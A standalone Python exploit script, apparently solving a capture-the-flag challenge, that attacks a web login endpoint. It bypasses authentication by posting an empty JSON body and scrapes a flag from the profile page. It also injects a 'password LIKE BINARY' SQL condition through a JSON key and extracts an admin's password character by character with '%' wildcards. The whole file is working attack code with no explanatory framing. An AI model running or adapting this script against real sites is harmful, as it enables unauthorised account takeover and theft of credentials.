#!/usr/bin/env python3
import argparse
import re
import sys
from urllib.parse import urljoin

import requests


ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
MAX_LENGTH = 32
SUCCESS_KEYWORD = "success"

LOGIN_PATH = "/SigninController/loginAuth"
PROFILE_PATH = "/profile"

PASSWORD_PARAM = "password LIKE BINARY"
EMAIL_PARAM = "email"


def normalize_urls(url):
    url = url.rstrip("/")

    if url.endswith(LOGIN_PATH):
        base_url = url.replace(LOGIN_PATH, "")
        login_url = url
    else:
        base_url = url
        login_url = urljoin(base_url + "/", LOGIN_PATH.lstrip("/"))

    profile_url = urljoin(base_url + "/", PROFILE_PATH.lstrip("/"))
    return login_url, profile_url


def get_session(session, login_url):
    try:
        response = session.post(login_url, json={}, timeout=10)
        return SUCCESS_KEYWORD in response.text and bool(session.cookies.get_dict())
    except requests.RequestException:
        return False


def get_user_flag(session, profile_url):
    try:
        response = session.get(profile_url, timeout=10)
    except requests.RequestException:
        return None

    match = re.search(r"Flag:\s*([A-Za-z0-9{}_@!#$%.\-]+)", response.text)
    return match.group(1) if match else None


def get_admin_password(session, login_url, email):
    password = ""

    while len(password) < MAX_LENGTH:
        for char in ALPHABET:
            payload = {
                PASSWORD_PARAM: password + char + "%",
                EMAIL_PARAM: email
            }

            try:
                response = session.post(login_url, json=payload, timeout=10)
            except requests.RequestException:
                return None

            if SUCCESS_KEYWORD in response.text:
                password += char
                break
        else:
            break

    return password if password else None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-e", "--email")
    args = parser.parse_args()

    login_url, profile_url = normalize_urls(args.url)
    session = requests.Session()

    if args.email:
        admin_password = get_admin_password(session, login_url, args.email)

        if admin_password:
            print(f"[+] Admin password: {admin_password}")

        sys.exit(0)

    if not get_session(session, login_url):
        sys.exit(1)

    user_flag = get_user_flag(session, profile_url)

    if user_flag:
        print(f"[+] User flag: {user_flag}")


if __name__ == "__main__":
    main()
